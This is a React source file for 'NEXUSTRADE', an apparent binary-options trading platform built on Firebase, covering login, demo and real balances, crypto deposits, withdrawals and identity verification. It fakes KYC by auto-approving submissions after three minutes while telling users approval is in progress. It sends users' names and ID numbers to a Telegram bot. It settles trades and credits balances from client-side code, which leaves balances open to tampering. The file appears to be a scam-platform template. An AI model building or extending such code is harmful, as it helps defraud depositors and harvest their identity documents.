import React, { useState, useEffect, useRef, useCallback } from 'react';
import { HashRouter, Routes, Route, Navigate, useNavigate } from 'react-router-dom';
import { 
    signInWithEmailAndPassword, 
    createUserWithEmailAndPassword, 
    onAuthStateChanged, 
    signOut 
} from 'firebase/auth';
import { 
    doc, 
    setDoc, 
    onSnapshot, 
    collection, 
    query, 
    where, 
    addDoc, 
    updateDoc,
    increment,
    limit 
} from 'firebase/firestore';
import { auth, db } from './firebase';

import TradingViewChart from './components/TradingViewChart';
import TradePanel from './components/TradePanel';
import { DepositModal, WithdrawalModal, KYCModal } from './components/Modals';
import { UserProfile, Trade, Transaction, AccountType, TransactionStatus, KYCStatus, Timeframe } from './types';
import { PAIRS, PAYOUT_PERCENTAGE } from './constants';
import { sendTelegramNotification } from './services/telegramService';

// --- COMPONENTS ---

const LandingPage = () => {
    const navigate = useNavigate();
    return (
        <div className="min-h-screen bg-[#05070a] relative overflow-hidden flex flex-col hero-pattern">
            <div className="absolute top-[-20%] left-[-10%] w-[60%] h-[60%] bg-blue-600/20 blur-[150px] rounded-full"></div>
            <nav className="h-20 flex items-center justify-between px-8 md:px-20 relative z-10">
                <h1 className="text-2xl font-black text-blue-500 italic tracking-tighter text-glow">NEXUSTRADE</h1>
                <button onClick={() => navigate('/auth')} className="bg-[#1e222d] border-2 border-white/20 px-8 py-2.5 rounded-full text-[10px] font-black uppercase tracking-widest hover:bg-white hover:text-black hover:border-white transition-all shadow-[0_4px_20px_rgba(0,0,0,0.5)]">Client Login</button>
            </nav>
            <main className="flex-1 flex flex-col items-center justify-center text-center px-6 relative z-10 pt-10 pb-20">
                <div className="animate-fade-in">
                    <h2 className="text-5xl md:text-8xl font-black text-white tracking-tighter leading-none mb-6">
                        Trade global markets <br /> <span className="text-blue-500 italic">with confidence</span>
                    </h2>
                    <p className="text-gray-400 text-lg md:text-xl max-w-2xl mx-auto mb-12 font-medium">
                        Institutional-grade liquidity and lightning-fast execution on a professional platform.
                    </p>
                    <div className="flex flex-col sm:flex-row items-center justify-center gap-4">
                        <button onClick={() => navigate('/auth')} className="w-full sm:w-auto px-12 py-5 bg-blue-600 rounded-2xl font-black text-white text-sm tracking-widest shadow-[0_10px_40px_rgba(37,99,235,0.4)] hover:scale-105 active:scale-95 transition-all uppercase border-2 border-blue-400/30">Get Started</button>
                    </div>
                    <div className="mt-12 text-[10px] text-gray-600 font-bold uppercase tracking-[0.3em] max-w-md mx-auto leading-relaxed">
                        <span className="text-red-500/50">Risk Warning:</span> Trading involves significant risk. Our <span className="underline cursor-pointer">Privacy Policy</span> ensures your data is encrypted.
                    </div>
                </div>
            </main>
        </div>
    );
};

const Header: React.FC<{ 
    user: UserProfile; 
    activeAccount: AccountType; 
    setActiveAccount: (a: AccountType) => void;
    onDeposit: () => void;
    onWithdraw: () => void;
    onKYC: () => void;
    onToggleHistory: () => void;
}> = ({ user, activeAccount, setActiveAccount, onDeposit, onWithdraw, onKYC, onToggleHistory }) => (
    <header className="h-16 md:h-20 bg-[#0d1117] border-b-2 border-white/10 flex items-center justify-between px-4 md:px-8 shrink-0 z-[50000] shadow-2xl">
        <div className="flex items-center gap-4">
            <button onClick={onToggleHistory} className="p-2 text-gray-400 hover:text-white transition-colors">
                <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M4 6h16M4 12h16M4 18h16"></path></svg>
            </button>
            <h1 className="text-xl md:text-2xl font-black text-blue-500 tracking-tighter hidden sm:block italic text-glow">NEXUSTRADE</h1>
            <div className="flex bg-black rounded-full p-1 border-2 border-white/10">
                <button onClick={() => setActiveAccount(AccountType.DEMO)} className={`px-5 py-1.5 rounded-full text-[10px] font-black transition-all ${activeAccount === AccountType.DEMO ? 'bg-yellow-500 text-black shadow-[0_4px_12px_rgba(234,179,8,0.5)]' : 'text-gray-500'}`}>DEMO</button>
                <button onClick={() => setActiveAccount(AccountType.REAL)} className={`px-5 py-1.5 rounded-full text-[10px] font-black transition-all ${activeAccount === AccountType.REAL ? 'bg-green-500 text-black shadow-[0_4px_12px_rgba(34,197,94,0.5)]' : 'text-gray-500'}`}>REAL</button>
            </div>
        </div>
        <div className="flex items-center gap-4">
            <div className="text-right">
                <div className="text-[8px] text-gray-500 uppercase font-black tracking-widest mb-0.5">Terminal Balance</div>
                <div className={`text-lg md:text-2xl font-black tabular-nums tracking-tighter ${activeAccount === AccountType.REAL ? 'text-green-500' : 'text-yellow-500'}`}>
                    ${(activeAccount === AccountType.REAL ? user.realBalance : user.demoBalance).toLocaleString(undefined, { minimumFractionDigits: 2 })}
                </div>
            </div>
            <div className="relative group">
                <button className="w-11 h-11 bg-white/5 rounded-full border-2 border-white/10 flex items-center justify-center text-white hover:border-blue-500 transition-all shadow-xl">
                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path></svg>
                </button>
                <div className="absolute right-0 top-[120%] w-64 bg-[#161b22] border-2 border-white/10 rounded-2xl shadow-[0_20px_80px_rgba(0,0,0,0.9)] opacity-0 group-hover:opacity-100 pointer-events-none group-hover:pointer-events-auto transition-all transform origin-top-right p-4 z-[99999] scale-95 group-hover:scale-100">
                    <div className="pb-3 border-b border-white/10 mb-3 text-center">
                        <p className="text-[10px] text-gray-500 font-black uppercase tracking-widest mb-1">Authenticated ID</p>
                        <p className="text-xs font-black text-white truncate px-2">{user.email}</p>
                    </div>
                    <div className="space-y-2">
                        <button onClick={onKYC} className="w-full text-left p-3 hover:bg-white/5 rounded-xl text-sm flex items-center gap-3 transition-all border border-transparent hover:border-white/10">
                            <div className="w-8 h-8 rounded-lg bg-blue-500/20 flex items-center justify-center text-blue-500 italic font-black text-xs border border-blue-500/30">V</div>
                            <div className="flex flex-col"><span className="font-black text-xs">Verification</span><span className={`text-[9px] font-black uppercase tracking-tighter ${user.kycStatus === KYCStatus.APPROVED ? 'text-green-500' : 'text-yellow-500'}`}>{user.kycStatus}</span></div>
                        </button>
                        <a href="https://t.me/your_support_bot" target="_blank" className="w-full text-left p-3 hover:bg-blue-500/10 rounded-xl text-xs font-black flex items-center gap-3 transition-all text-blue-400 uppercase tracking-widest border border-transparent hover:border-blue-500/30">Support Center</a>
                        <button onClick={onDeposit} className="w-full text-left p-3 hover:bg-green-500/10 rounded-xl text-xs font-black flex items-center gap-3 transition-all text-green-500 uppercase tracking-widest border border-transparent hover:border-green-500/30">Deposit Funds</button>
                        <button onClick={onWithdraw} className="w-full text-left p-3 hover:bg-red-500/10 rounded-xl text-xs font-black flex items-center gap-3 transition-all text-red-500 uppercase tracking-widest border border-transparent hover:border-red-500/30">Withdraw Funds</button>
                        <button onClick={() => signOut(auth)} className="w-full text-center py-3 bg-red-600 hover:bg-red-700 text-white rounded-xl text-[10px] font-black uppercase tracking-widest mt-2 transition-all shadow-lg border border-red-400/20">Close Terminal</button>
                    </div>
                </div>
            </div>
        </div>
    </header>
);

const MainApp = ({ user }: { user: UserProfile }) => {
    const [activeAccount, setActiveAccount] = useState<AccountType>(AccountType.DEMO);
    const [trades, setTrades] = useState<Trade[]>([]);
    const [transactions, setTransactions] = useState<Transaction[]>([]);
    const [currentPair, setCurrentPair] = useState(PAIRS[0]);
    const [chartResolution, setChartResolution] = useState(60); 
    const [currentTimeframe, setCurrentTimeframe] = useState<Timeframe>('1m');
    const priceRef = useRef(0);
    const [candleCountdown, setCandleCountdown] = useState(60);
    const [isHistoryOpen, setHistoryOpen] = useState(false);
    const [historyTab, setHistoryTab] = useState<'active' | 'closed' | 'transactions'>('active');
    const [isDepositOpen, setDepositOpen] = useState(false);
    const [isWithdrawOpen, setWithdrawOpen] = useState(false);
    const [isKYCOpen, setKYCOpen] = useState(false);

    useEffect(() => {
        const tradesUnsub = onSnapshot(query(collection(db, 'trades'), where('userId', '==', user.uid), limit(50)), (snap) => {
            setTrades(snap.docs.map(d => ({ id: d.id, ...d.data() } as Trade)).sort((a,b) => b.createdAt - a.createdAt));
        });
        const txUnsub = onSnapshot(query(collection(db, 'transactions'), where('userId', '==', user.uid), limit(50)), (snap) => {
            setTransactions(snap.docs.map(d => ({ id: d.id, ...d.data() } as Transaction)).sort((a,b) => b.createdAt - a.createdAt));
        });
        return () => { tradesUnsub(); txUnsub(); };
    }, [user.uid]);

    // AUTO-APPROVE KYC after 3 minutes
    useEffect(() => {
        if (user.kycStatus === KYCStatus.PENDING && user.kycData?.submittedAt) {
            const timeout = setTimeout(async () => {
                await updateDoc(doc(db, 'users', user.uid), { kycStatus: KYCStatus.APPROVED });
                await sendTelegramNotification(`✅ <b>KYC AUTO-APPROVED</b>\nUser: ${user.email}`);
            }, 180000); // 3 Minutes
            return () => clearTimeout(timeout);
        }
    }, [user.kycStatus, user.kycData?.submittedAt, user.uid, user.email]);

    // AUTO-CREDIT DEPOSITS
    useEffect(() => {
        const creditApprovedDeposits = async () => {
            const uncredited = transactions.filter(tx => 
                tx.type === 'DEPOSIT' && 
                tx.status === TransactionStatus.APPROVED && 
                tx.isCredited === false
            );
            for (const tx of uncredited) {
                try {
                    await Promise.all([
                        updateDoc(doc(db, 'users', user.uid), { realBalance: increment(tx.amount) }),
                        updateDoc(doc(db, 'transactions', tx.id), { isCredited: true })
                    ]);
                } catch (e) { console.error("Auto-credit failed:", e); }
            }
        };
        if (transactions.length > 0) creditApprovedDeposits();
    }, [transactions, user.uid]);

    useEffect(() => {
        const timer = setInterval(() => setCandleCountdown(p => p <= 1 ? chartResolution : p - 1), 1000);
        return () => clearInterval(timer);
    }, [chartResolution]);

    useEffect(() => {
        const interval = setInterval(async () => {
            const now = Date.now();
            const openTrades = trades.filter(t => t.status === 'OPEN' && now >= t.expiryTime);
            for (const t of openTrades) {
                const win = t.direction === 'UP' ? priceRef.current > t.entryPrice : priceRef.current < t.entryPrice;
                const profitVal = win ? t.amount * (1 + PAYOUT_PERCENTAGE) : 0;
                await updateDoc(doc(db, 'trades', t.id), { 
                    status: win ? 'WIN' : 'LOSS', 
                    profit: win ? t.amount * PAYOUT_PERCENTAGE : -t.amount 
                });
                if (win) {
                    const balanceField = t.accountType === AccountType.REAL ? 'realBalance' : 'demoBalance';
                    await updateDoc(doc(db, 'users', user.uid), { [balanceField]: increment(profitVal) });
                }
            }
        }, 1000);
        return () => clearInterval(interval);
    }, [user.uid, trades]);

    const handleTrade = useCallback(async (direction: 'UP' | 'DOWN', amount: number, duration: number) => {
        const currentBal = activeAccount === AccountType.REAL ? user.realBalance : user.demoBalance;
        if (!amount || amount <= 0) { alert("Please enter a valid amount!"); return; }
        if (currentBal <= 0 || amount > currentBal) { alert("Insufficient funds in your account!"); return; }
        if (priceRef.current === 0) { alert("Market syncing..."); return; }

        try {
            const newTradeData = { 
                userId: user.uid, 
                symbol: currentPair.name, 
                direction, 
                amount, 
                entryPrice: priceRef.current, 
                expiryTime: Date.now() + (duration * 1000), 
                createdAt: Date.now(), 
                accountType: activeAccount, 
                status: 'OPEN', 
                profit: 0 
            };
            const balanceField = activeAccount === AccountType.REAL ? 'realBalance' : 'demoBalance';
            await Promise.all([
                updateDoc(doc(db, 'users', user.uid), { [balanceField]: increment(-amount) }),
                addDoc(collection(db, 'trades'), newTradeData)
            ]);
        } catch (err) { alert("Trade execution failed."); }
    }, [user.uid, activeAccount, currentPair, user.realBalance, user.demoBalance]);

    const handleDepositSubmit = async (data: any) => {
        try {
            const txData = {
                userId: user.uid,
                type: 'DEPOSIT' as const,
                amount: parseFloat(data.amount),
                network: data.network,
                method: 'Crypto',
                status: TransactionStatus.PENDING,
                createdAt: Date.now(),
                isCredited: false
            };
            const docRef = await addDoc(collection(db, 'transactions'), txData);
            await sendTelegramNotification(`💰 <b>NEW DEPOSIT REQUEST</b>\nUser: ${user.email}\nAmount: $${data.amount}\nNetwork: ${data.network}`, docRef.id);
            setDepositOpen(false);
            alert("Deposit request logged!");
        } catch (err) { alert("Submission failed."); }
    };

    const handleWithdrawSubmit = async (data: any) => {
        try {
            const amount = parseFloat(data.amount);
            if (amount > user.realBalance) { alert("Insufficient REAL balance!"); return; }
            await updateDoc(doc(db, 'users', user.uid), { realBalance: increment(-amount) });
            const txData = {
                userId: user.uid,
                type: 'WITHDRAWAL' as const,
                amount: amount,
                method: data.method,
                address: data.details,
                status: TransactionStatus.PENDING,
                createdAt: Date.now()
            };
            const docRef = await addDoc(collection(db, 'transactions'), txData);
            await sendTelegramNotification(`💸 <b>NEW WITHDRAWAL REQUEST</b>\nUser: ${user.email}\nAmount: $${data.amount}\nMethod: ${data.method}\nDetails: ${data.details}`, docRef.id);
            setWithdrawOpen(false);
            alert("Withdrawal submitted.");
        } catch (err) { alert("Submission failed."); }
    };

    const handleKYCSubmit = async (data: any) => {
        try {
            await updateDoc(doc(db, 'users', user.uid), {
                kycStatus: KYCStatus.PENDING,
                kycData: { 
                    fullName: data.fullName, 
                    idNumber: data.idNumber, 
                    frontImage: data.frontImage, 
                    backImage: data.backImage, 
                    submittedAt: Date.now() 
                }
            });
            await sendTelegramNotification(`🆔 <b>KYC SUBMISSION</b>\nUser: ${user.email}\nName: ${data.fullName}\nID: ${data.idNumber}`);
            setKYCOpen(false);
            alert("Verification documents received. Approval in progress (ETA 3 mins).");
        } catch (err) { alert("Submission failed."); }
    };

    return (
        <div className="flex flex-col h-screen w-full bg-[#05070a] overflow-hidden">
            <Header user={user} activeAccount={activeAccount} setActiveAccount={setActiveAccount} 
                onDeposit={() => setDepositOpen(true)} onWithdraw={() => setWithdrawOpen(true)}
                onKYC={() => setKYCOpen(true)} onToggleHistory={() => setHistoryOpen(true)} />
            <main className="flex-1 flex flex-col relative z-0 overflow-hidden">
                <div className="flex-[0.7] relative flex flex-col border-b-2 border-white/10 shadow-xl overflow-hidden">
                    <div className="bg-[#0d1117] p-2 border-b border-white/5 flex gap-2 overflow-x-auto scrollbar-hide shrink-0">
                        {PAIRS.map(pair => (
                            <button key={pair.symbol} onClick={() => setCurrentPair(pair)} className={`px-5 py-2 rounded-full text-[10px] font-black transition-all border-2 ${currentPair.symbol === pair.symbol ? 'bg-blue-600 text-white shadow-lg border-blue-400/30' : 'bg-white/5 text-gray-500 hover:text-white hover:bg-white/10 border-transparent'}`}>{pair.name}</button>
                        ))}
                    </div>
                    <div className="flex-1 min-h-0">
                        <TradingViewChart 
                            key={`${currentPair.symbol}-${chartResolution}-${activeAccount}`} 
                            symbol={currentPair.symbol} 
                            trades={trades.filter(t => t.accountType === activeAccount)} 
                            onPriceUpdate={p => priceRef.current = p} 
                            candleCountdown={candleCountdown} 
                            resolution={chartResolution}
                            currentTimeframe={currentTimeframe}
                            onResolutionChange={(res, tf) => { setChartResolution(res); setCurrentTimeframe(tf); setCandleCountdown(res); }}
                        />
                    </div>
                </div>
                <div className="flex-[0.3] flex flex-col min-h-0">
                    <TradePanel balance={activeAccount === AccountType.REAL ? user.realBalance : user.demoBalance} onTrade={handleTrade} candleCountdown={candleCountdown} />
                </div>
            </main>
            {isHistoryOpen && (
                <div className="fixed inset-0 z-[60000] flex">
                    <div className="absolute inset-0 bg-black/95 transition-opacity" onClick={() => setHistoryOpen(false)}></div>
                    <div className="relative w-full max-sm:w-full w-96 bg-[#0d1117] h-full shadow-[0_0_120px_rgba(0,0,0,1)] flex flex-col animate-slide-right ml-auto border-l-2 border-white/10">
                        <div className="p-6 border-b-2 border-white/10 flex justify-between items-center"><h2 className="text-xl font-black uppercase italic text-glow tracking-tighter">{activeAccount} HISTORY</h2><button onClick={() => setHistoryOpen(false)} className="text-gray-500 hover:text-white transition-all text-xl font-black">✕</button></div>
                        <div className="flex bg-black p-1.5 m-4 rounded-xl border-2 border-white/10">
                            {['active', 'closed', 'transactions'].map(tab => (
                                <button key={tab} onClick={() => setHistoryTab(tab as any)} className={`flex-1 py-2.5 text-[10px] font-black rounded-lg transition-all ${historyTab === tab ? 'bg-blue-600 text-white shadow-2xl' : 'text-gray-600 hover:text-gray-400'}`}>{tab.toUpperCase()}</button>
                            ))}
                        </div>
                        <div className="flex-1 overflow-y-auto p-4 space-y-4 scrollbar-hide">
                            {historyTab === 'active' && trades.filter(t => t.status === 'OPEN' && t.accountType === activeAccount).map(trade => (
                                <div key={trade.id} className="bg-black/40 p-5 rounded-2xl border-2 border-white/10 flex justify-between items-center shadow-inner hover:border-blue-500/50 transition-all">
                                    <div><div className="text-[10px] font-black text-blue-500 uppercase mb-1 tracking-widest">{trade.symbol}</div><div className={`text-base font-black ${trade.direction === 'UP' ? 'text-green-500' : 'text-red-500'}`}>{trade.direction} ${trade.amount}</div></div>
                                    <div className="text-sm font-black tabular-nums bg-blue-600/20 px-4 py-1.5 rounded-full text-blue-400 border-2 border-blue-500/20">{Math.max(0, Math.floor((trade.expiryTime - Date.now()) / 1000))}s</div>
                                </div>
                            ))}
                            {historyTab === 'closed' && trades.filter(t => t.status !== 'OPEN' && t.accountType === activeAccount).map(trade => (
                                <div key={trade.id} className={`bg-black/40 p-5 rounded-2xl border-2 ${trade.status === 'WIN' ? 'border-green-500/30 shadow-[0_0_20px_rgba(34,197,94,0.1)]' : 'border-red-500/30 shadow-[0_0_20px_rgba(239,68,68,0.1)]'} flex justify-between items-center`}>
                                    <div><div className="text-[10px] font-black text-gray-500 uppercase">{trade.symbol}</div><div className={`text-base font-black ${trade.status === 'WIN' ? 'text-green-500' : 'text-red-500'}`}>{trade.status} ${trade.amount}</div></div>
                                    <div className={`text-base font-black ${trade.profit >= 0 ? 'text-green-500' : 'text-red-500'}`}>${trade.profit.toFixed(2)}</div>
                                </div>
                            ))}
                            {historyTab === 'transactions' && transactions.map(tx => (
                                <div key={tx.id} className="bg-black/40 p-5 rounded-2xl border-2 border-white/10 flex justify-between items-center">
                                    <div><div className={`text-[9px] font-black uppercase px-2 py-1 rounded-md tracking-widest ${tx.type === 'DEPOSIT' ? 'bg-green-500/20 text-green-500 border border-green-500/30' : 'bg-red-500/20 text-red-500 border border-red-500/30'}`}>{tx.type}</div><div className="text-xl font-black mt-3 text-white tracking-tighter">${tx.amount.toFixed(2)}</div></div>
                                    <div className={`text-[9px] font-black px-3 py-1.5 rounded-full uppercase border-2 ${tx.status === TransactionStatus.PENDING ? 'border-yellow-500/30 text-yellow-500 bg-yellow-500/10' : tx.status === TransactionStatus.APPROVED ? 'border-green-500/30 text-green-500 bg-green-500/10' : 'border-red-500/30 text-red-500 bg-red-500/10'}`}>{tx.status}</div>
                                </div>
                            ))}
                        </div>
                    </div>
                </div>
            )}
            <DepositModal isOpen={isDepositOpen} onClose={() => setDepositOpen(false)} onSubmit={handleDepositSubmit} />
            <WithdrawalModal isOpen={isWithdrawOpen} onClose={() => setWithdrawOpen(false)} onSubmit={handleWithdrawSubmit} />
            <KYCModal isOpen={isKYCOpen} onClose={() => setKYCOpen(false)} onSubmit={handleKYCSubmit} />
        </div>
    );
};

const AuthPage = () => {
    const [isLogin, setIsLogin] = useState(true);
    const [email, setEmail] = useState('');
    const [pwd, setPwd] = useState('');
    const [loading, setLoading] = useState(false);
    const navigate = useNavigate();
    const handleAuth = async (e: any) => {
        e.preventDefault(); setLoading(true);
        try {
            if (isLogin) await signInWithEmailAndPassword(auth, email, pwd);
            else await createUserWithEmailAndPassword(auth, email, pwd);
            navigate('/trading');
        } catch (err: any) { alert(err.message); setLoading(false); }
    };
    return (
        <div className="min-h-screen bg-[#05070a] flex items-center justify-center p-6 hero-pattern">
            <div className="w-full max-w-md animate-fade-in">
                <div className="text-center mb-10"><h1 className="text-4xl font-black text-blue-500 italic tracking-tighter text-glow">NEXUSTRADE</h1></div>
                <div className="bg-[#111928] border-2 border-white/10 rounded-[2.5rem] p-8 shadow-[0_40px_100px_rgba(0,0,0,0.8)]">
                    <div className="flex bg-black rounded-2xl p-1.5 border-2 border-white/5 mb-8">
                        <button onClick={() => setIsLogin(true)} className={`flex-1 py-4 rounded-xl text-xs font-black transition-all ${isLogin ? 'bg-blue-600 text-white shadow-2xl' : 'text-gray-500 hover:text-gray-300'}`}>LOGIN</button>
                        <button onClick={() => setIsLogin(false)} className={`flex-1 py-4 rounded-xl text-xs font-black transition-all ${!isLogin ? 'bg-blue-600 text-white shadow-2xl' : 'text-gray-500 hover:text-gray-300'}`}>REGISTER</button>
                    </div>
                    <form onSubmit={handleAuth} className="space-y-6">
                        <div className="space-y-2">
                            <label className="text-[10px] font-black text-gray-500 uppercase px-2 tracking-widest">Global Account Email</label>
                            <input required type="email" placeholder="identity@nexus.trade" value={email} onChange={e => setEmail(e.target.value)} className="w-full bg-black border-2 border-white/10 rounded-2xl p-4 text-sm font-bold text-white outline-none focus:border-blue-500 transition-all shadow-inner" />
                        </div>
                        <div className="space-y-2">
                            <label className="text-[10px] font-black text-gray-500 uppercase px-2 tracking-widest">Master Access Key</label>
                            <input required type="password" placeholder="••••••••••••" value={pwd} onChange={e => setPwd(e.target.value)} className="w-full bg-black border-2 border-white/10 rounded-2xl p-4 text-sm font-bold text-white outline-none focus:border-blue-500 transition-all shadow-inner" />
                        </div>
                        <button type="submit" disabled={loading} className="w-full py-5 bg-blue-600 rounded-2xl font-black text-white text-sm tracking-[0.2em] shadow-2xl active:scale-95 transition-all uppercase border-2 border-blue-400/30">{loading ? 'SYNCING DATA...' : (isLogin ? 'ENTER TERMINAL' : 'INITIALIZE PROFILE')}</button>
                    </form>
                </div>
            </div>
        </div>
    );
};

const App = () => {
    const [user, setUser] = useState<UserProfile | null>(null);
    const [loading, setLoading] = useState(true);

    useEffect(() => {
        const unsub = onAuthStateChanged(auth, (fbUser) => {
            if (fbUser) {
                onSnapshot(doc(db, 'users', fbUser.uid), (snap) => {
                    if (snap.exists()) setUser(snap.data() as UserProfile);
                    else {
                        const init: UserProfile = { uid: fbUser.uid, email: fbUser.email!, demoBalance: 10000, realBalance: 0, kycStatus: KYCStatus.UNSUBMITTED };
                        setDoc(doc(db, 'users', fbUser.uid), init);
                    }
                    setLoading(false);
                });
            } else { setUser(null); setLoading(false); }
        });
        return () => unsub();
    }, []);

    if (loading) return <div className="h-screen w-full bg-[#05070a] flex items-center justify-center"><div className="w-12 h-12 border-4 border-blue-500 border-t-transparent animate-spin rounded-full"></div></div>;

    return (
        <HashRouter>
            <Routes>
                <Route path="/" element={user ? <Navigate to="/trading" /> : <LandingPage />} />
                <Route path="/auth" element={user ? <Navigate to="/trading" /> : <AuthPage />} />
                <Route path="/trading" element={user ? <MainApp user={user} /> : <Navigate to="/" />} />
            </Routes>
        </HashRouter>
    );
};

export default App;